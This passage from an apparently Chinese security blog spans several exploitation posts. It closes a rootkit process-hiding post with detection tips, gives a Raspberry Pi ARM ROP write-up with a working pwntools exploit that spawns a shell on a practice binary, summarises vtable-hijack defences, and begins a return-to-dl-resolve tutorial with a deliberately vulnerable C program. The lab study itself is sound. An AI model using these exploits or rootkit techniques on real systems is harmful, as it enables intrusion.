<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Open psHook loaded successfully..</span><br><span class="line">PS PROCESS HIJACKED &#x2F;proc&#x2F;5874&#x2F;status</span><br></pre></td></tr></table></figure>
<p>成功实现了隐身！除此之外，还可以用这个方法隐藏多个进程。</p>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1.这里只是用另一个正在运行的进程来隐藏当前进程。所以在ps输出中会有重复的PID。很容易被发现，还有一些其他的方法可以完全隐藏它，在后面的rootkit文章中会进行介绍。<br>2.用lsmod可以查看内核上运行的模块：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ lsmod</span><br><span class="line">Module         Size  Used by</span><br><span class="line">phide           900  0</span><br></pre></td></tr></table></figure>
<p>3.想查看所有模块，可以使用：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;modules</span><br></pre></td></tr></table></figure>
<p>4.因为rootkits通常在内存中待命，所以最好使用一个可以主动寻找rootkit的程序，例如：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kbeast – https:&#x2F;&#x2F;volatility-labs.blogspot.ca&#x2F;2012&#x2F;09&#x2F;movp-15-kbeast-rootkit-detecting-hidden.html</span><br><span class="line">chkroot – http:&#x2F;&#x2F;www.chkrootkit.org&#x2F;</span><br><span class="line">kernel check – http:&#x2F;&#x2F;la-samhna.de&#x2F;library&#x2F;kern_check.c</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3337.html">http://bobao.360.cn/learning/detail/3337.html</a><br><a target="_blank" rel="noopener" href="https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/">https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/" data-id="ckhe7o4m7003ochl7b3wu926r" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-树莓派上练习ARM-PWN" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/" class="article-date">
  <time datetime="2016-12-26T14:40:56.000Z" itemprop="datePublished">2016-12-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/">树莓派上练习ARM PWN</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>练习的题目是Exploit Exercises Protostar上的堆栈题目，在树莓派上编译进行练习。<br>用<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">socat</a>把可执行文件绑定到6666端口。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat tcp-listen:6666,fork exec:.&#x2F;stack0</span><br></pre></td></tr></table></figure>
<p>ARM架构上，peda支持不够好，所以我在树莓派上装的<a target="_blank" rel="noopener" href="https://github.com/hugsy/gef">gef</a>。<br>由于这不是一个可执行堆栈，我们需要用ROP来获取shell，可执行文件本身很小，没有多少可用gadgets，需要利用其libc文件。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; vmmap</span><br><span class="line">     Start        End     Offset Perm Path</span><br><span class="line">0x00008000 0x00009000 0x00000000 r-x &#x2F;home&#x2F;pi&#x2F;Computer&#x2F;exploit&#x2F;stack0</span><br><span class="line">0x00010000 0x00011000 0x00000000 rw- &#x2F;home&#x2F;pi&#x2F;Computer&#x2F;exploit&#x2F;stack0</span><br><span class="line">0x76e66000 0x76f91000 0x00000000 r-x &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so</span><br><span class="line">0x76f91000 0x76fa1000 0x0012b000 --- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so</span><br><span class="line">0x76fa1000 0x76fa3000 0x0012b000 r-- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so</span><br><span class="line">0x76fa3000 0x76fa4000 0x0012d000 rw- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so</span><br><span class="line">0x76fa4000 0x76fa7000 0x00000000 rw-</span><br><span class="line">0x76fba000 0x76fbf000 0x00000000 r-x &#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libarmmem.so</span><br><span class="line">0x76fbf000 0x76fce000 0x00005000 --- &#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libarmmem.so</span><br><span class="line">0x76fce000 0x76fcf000 0x00004000 rw- &#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libarmmem.so</span><br><span class="line">0x76fcf000 0x76fef000 0x00000000 r-x &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;ld-2.19.so</span><br><span class="line">0x76ff7000 0x76ffb000 0x00000000 rw-</span><br><span class="line">0x76ffb000 0x76ffc000 0x00000000 r-x [sigpage]</span><br><span class="line">0x76ffc000 0x76ffd000 0x00000000 r-- [vvar]</span><br><span class="line">0x76ffd000 0x76ffe000 0x00000000 r-x [vdso]</span><br><span class="line">0x76ffe000 0x76fff000 0x0001f000 r-- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;ld-2.19.so</span><br><span class="line">0x76fff000 0x77000000 0x00020000 rw- &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;ld-2.19.so</span><br><span class="line">0x7efdf000 0x7f000000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>
<p>将libc文件拷贝到当前目录，以便查找gadget。在ARM架构下，参数通过寄存器传递给函数。例如r0会将保留的第一个参数传递给一个给定的函数调用。在我们的这个例子中就是system()函数。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cp &#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc-2.19.so .</span><br><span class="line">$ ROPgadget --binary libc-2.19.so --only &quot;pop&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x0007a12c : pop &#123;r0, r4, pc&#125;</span><br><span class="line">...</span><br><span class="line">$ ROPgadget --binary libc-2.19.so --only &quot;pop|add|bx&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x0005cbc8 : pop &#123;r4, r5, r6, r7, lr&#125; ; add sp, sp, #0x10 ; bx lr</span><br></pre></td></tr></table></figure>
<p>找这两条gadget的作用看到exploit就明白了。再从libc中找到<code>&#39;/bin/sh&#39;</code>字符串的偏移。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">fd &#x3D; open(&#39;libc-2.19.so&#39;)</span><br><span class="line">content &#x3D; fd.read()</span><br><span class="line">offset &#x3D; content.find(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">hex(offset)</span><br><span class="line">0x11db20</span><br></pre></td></tr></table></figure>
<p>关闭树莓派上的地址随机化，这样gadget偏移地址加上libc基址就是实际地址：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">2 # 表示已经打开ASLR</span><br><span class="line">$ sudo echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">bash: &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space: Permission denied</span><br><span class="line">$ su</span><br><span class="line">Password:</span><br><span class="line">su: Authentication failure</span><br></pre></td></tr></table></figure>
<p>因为root没有解锁，解锁root并关闭ASLR：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo passwd</span><br><span class="line">Enter new UNIX password: # root</span><br><span class="line">Retype new UNIX password: # root</span><br><span class="line">passwd: password updated successfully</span><br><span class="line">$ su</span><br><span class="line">Password: # root</span><br><span class="line"># echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line"># cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>exploit脚本我是在Ubuntu上写的：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;192.168.1.104&quot;</span></span><br><span class="line">PORT = <span class="number">6666</span></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p32(<span class="number">0x76ee012c</span>) <span class="comment"># pop &#123;r0, r4, pc&#125;</span></span><br><span class="line">payload += p32(<span class="number">0x76f83b20</span>) <span class="comment"># /bin/sh</span></span><br><span class="line">payload += <span class="string">&#x27;BBBB&#x27;</span></span><br><span class="line">payload += p32(<span class="number">0x76ec2bc8</span>) <span class="comment"># pop &#123;r4, r5, r6, r7, lr&#125; ; add sp, sp, #0x10 ; bx lr</span></span><br><span class="line">payload += <span class="string">&#x27;CCCC&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;DDDD&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;EEEE&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;FFFF&#x27;</span></span><br><span class="line">payload += p32(<span class="number">0x76e9ffac</span>) <span class="comment"># system@libc</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;press enter to send payload&#x27;</span></span><br><span class="line">raw_input()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/103435.html">http://www.freebuf.com/articles/system/103435.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2016/12/26/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E7%BB%83%E4%B9%A0ARM-PWN/" data-id="ckhe7o4nr0064chl734pn0p7z" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-C-虚函数调用攻防战" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/" class="article-date">
  <time datetime="2016-11-20T02:19:15.000Z" itemprop="datePublished">2016-11-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/">C++虚函数调用攻防战</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这篇文章是参考UC Berkeley张超博士的一个视频和两篇NDSS论文，学习的一些关于C++虚函数安全相关的内容。<br><code>虚函数调用</code>是面向对象中的一个很重要的特性，用来支持多态。运行时实际调用的函数是根据对象来决定的。运行时找虚函数是通过<code>vtable</code>函数指针来实现，vtable指针由编译器添加到对象中。</p>
<h3 id="虚函数表劫持攻击"><a href="#虚函数表劫持攻击" class="headerlink" title="虚函数表劫持攻击"></a>虚函数表劫持攻击</h3><p>vtable是从对象中读出来的，而对象是位于可写内存段，所以攻击者有可能篡改vtable指针。<br><strong>vtable注入</strong><br>伪造vtable，在每个表项中填写ROP chain的地址。利用uaf等漏洞篡改vtable指针指向伪造的vtable，虚函数调用时，触发ROP。<br><strong>vtable重用</strong><br>不伪造vtable，篡改vtable指针指向已有的vtable。实际中非常少。<br><strong>vtable破坏</strong><br>直接篡改vtable，但现在不可行，因为编译器将vtable放到只读内存页。</p>
<h3 id="虚函数表防护"><a href="#虚函数表防护" class="headerlink" title="虚函数表防护"></a>虚函数表防护</h3><p><strong>VTint: Protecting Virutal Function Tables’ Integrity</strong><br>目标：二进制层面进行的防护，防护vtable劫持攻击。<br>设计：<code>vtable注入</code>和<code>vtable破坏</code>两种攻击方法的vtable都是可写的，因此在运行时检查vtable是否可写，如果可写则判断为受到攻击。<code>vtable重用</code>可以通过区分数据和vtable进行部分防护。<br>实现：理解二进制程序的基础上，对二进制程序进行修改。<br>1.解析二进制文件，恢复高级信息，如识别vtable信息、虚函数调用点。<br>PE文件格式：重定位表、导入/导出表<br>输出：候选函数入口点（重定位表中恢复）、候选vtable（vtable是一个数组，其中每个表项是一个虚函数指针，vtable需要重定位，每个表项也需要重定位）。<br>2.反汇编恢复控制流图等高级信息。<br>(1)识别构造函数：给对象分配内存、将vtable拷贝到分配内存中、成员变量初始化。<br>(2)识别真正的vtable：vtable一定会在某个构造函数中被引用到，所以被引用到的就是真正的vtable。<br>(3)识别虚函数调用：<br>虚函数调用是间接调用，this指针是虚函数调用的第一个参数。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [edi] ; edi保存vtable</span><br><span class="line">push ecx ; PE中this指针存在ecx</span><br><span class="line">call [eax+8]</span><br></pre></td></tr></table></figure>
<p>3.重写二机制文件，部署安全策略。<br>将识别出的vtable拷贝到新的只读内存页，加一个特殊的ID <code>VTID</code>来区分这个内存页。<br>在虚函数调用点之前添加检查语句：检查vtable的内存页是否包含VTID（区分vtable与数据）；检查vtable的内存页是不是只读。<br><strong>VTrust: Regaining Trust on Virtual Calls</strong><br>目标：源代码层次上进行防护<br>设计：两层防护措施相结合。<br>1.验证vtable目标虚函数是否有匹配的类型<br>虚函数调用点处知道目标函数的函数名和参数列表，虚函数定义点处也是知道函数名和参数列表的。C++调用约定，必须是兼容类型信息：调用点处的类必须是定义点处类本身或其子类，因此直接验证这两个类型是否相等。验证方法，将类型信息编码成整数：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signature &#x3D; hash(funcName, paramList, qualifiers, classinfo)</span><br></pre></td></tr></table></figure>
<p>无法防护动态代码，攻击者可能伪造signature。<br>2.确保vtable指针是一个合法的指针<br>限制运行时目标虚函数必须指向静态代码，不能指向动态代码。打断传统的vtable查找过程，在中间引入一个只读内存可信区域（转换表），将合法的vtable指针放到这个转换表中，将原来存放vtable指针的位置换成一个索引，索引用来在转换表中找vtable指针。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://www.edu.cn/xxh/spkt/msjt/sp/201603/t20160310_1374571.shtml">围绕虚函数调用的攻防战</a><br>VTint: Protecting Virutal Function Tables’ Integrity<br>VTrust: Regaining Trust on Virtual Calls</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2016/11/20/C-%E8%99%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2%E6%88%98/" data-id="ckhe7o4ko0015chl7e71wc71n" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Return-to-dl-resolve" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/11/09/Return-to-dl-resolve/" class="article-date">
  <time datetime="2016-11-09T02:59:58.000Z" itemprop="datePublished">2016-11-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/11/09/Return-to-dl-resolve/">Return-to-dl-resolve</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>本文介绍通过return-to-dl-resolve的手法绕过NX和ASLR的限制。<br>这里构造一个存在栈缓冲区漏洞的程序，以方便后续构造ROP链。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o bof -m32 -fno-stack-protector bof.c</span><br></pre></td></tr></table></figure>

<h2 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h2><h3 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h3><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为<code>PT_DYNAMIC</code>的段，它包含<code>.dynamic</code>节。结构如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
<p>其中Tag对应着每个节。比如<code>JMPREL</code>对应着<code>.rel.plt</code><br><img src="/images/ret2dlresolve/dynamic.png"><br>节中包含目标文件的所有信息。节的结构如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word sh_name;      <span class="comment">// 节头部字符串表节区的索引</span></span><br><span class="line">    Elf32_Word sh_type;      <span class="comment">// 节类型</span></span><br><span class="line">    Elf32_Word sh_flags;     <span class="comment">// 节标志，用于描述属性</span></span><br><span class="line">    Elf32_Addr sh_addr;      <span class="comment">// 节的内存映像</span></span><br><span class="line">    Elf32_Off  sh_offset;    <span class="comment">// 节的文件偏移</span></span><br><span class="line">    Elf32_Word sh_size;      <span class="comment">// 节的长度</span></span><br><span class="line">    Elf32_Word sh_link;      <span class="comment">// 节头部表索引链接</span></span><br><span class="line">    Elf32_Word sh_info;      <span class="comment">// 附加信息</span></span><br><span class="line">    Elf32_Word sh_addralign; <span class="comment">// 节对齐约束</span></span><br><span class="line">    Elf32_Word sh_entsize;   <span class="comment">// 固定大小的节表项的长度</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<p>如下图，列出了该文件的31个节区。其中类型为REL的节区包含重定位表项。<br><img src="/images/ret2dlresolve/sections.png"><br>（1）<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;    <span class="comment">// 对于可执行文件，此值为虚拟地址</span></span><br><span class="line">    Elf32_Word r_info;      <span class="comment">// 符号表索引</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(info) ((info)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(info) ((unsigned char)(info))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type))</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/ret2dlresolve/reloc.png"><br>如图，在.rel.plt中列出了链接的C库函数，以下均以write函数为例，write函数的r_offset=0x0804a01c，r_info=0x607<br>（2）<code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节保存全局函数偏移表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值。<br><img src="/images/ret2dlresolve/gotplt.png"><br>（3）<code>.dynsym</code>节包含了动态链接符号表。Elf32_Sym[num]中的num对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>。根据定义，  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; <span class="number">8</span></span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name;     <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">    Elf32_Addr st_value;    <span class="comment">// Symbol value</span></span><br><span class="line">    Elf32_Word st_size;     <span class="comment">// Symbol size</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">// Symbol type and binding</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">// Symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">    Elf32_Section st_shndx; <span class="comment">// Section index</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
<p>write的索引值为ELF32_R_SYM(0x607) = 0x607 &gt;&gt; 8 = 6。而Elf32_Sym[6]即保存着write的符号表信息。并且ELF32_R_TYPE(0x607) = 7，对应<code>R_386_JUMP_SLOT</code>。<br><img src="/images/ret2dlresolve/dynsym.png"><br>（4）<code>.dynstr</code>节包含了动态链接的字符串。这个节以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。<br><img src="/images/ret2dlresolve/dynstr.png"><br>Elf32_Sym[6]-&gt;st_name=0x4c（.dynsym + Elf32_Sym_size * num），所以<code>.dynstr</code>加上0x4c的偏移量，就是字符串write。<br>（5）<code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。<br><img src="/images/ret2dlresolve/write_plt.png"><br>当程序执行call write@plt时，实际会跳到0x0804a01c去执行。</p>
